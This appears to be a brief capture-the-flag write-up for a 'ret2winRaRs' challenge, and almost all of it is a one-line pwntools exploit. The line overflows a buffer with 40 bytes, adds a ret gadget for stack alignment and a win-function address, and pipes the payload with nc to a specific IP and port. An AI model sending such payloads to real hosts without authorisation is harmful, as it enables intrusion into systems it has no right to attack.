# ret2winRaRs: ret2win + align stack

buffer overflow -> return to win function + align stack with a ret instruction

```bash
python3 -c "from pwn import *; import sys; sys.stdout.buffer.write(b'A'*40 + p64(0x0000000000401016) + p64(0x0000000000401162)); print('\n')" | nc 193.57.159.27 30527
```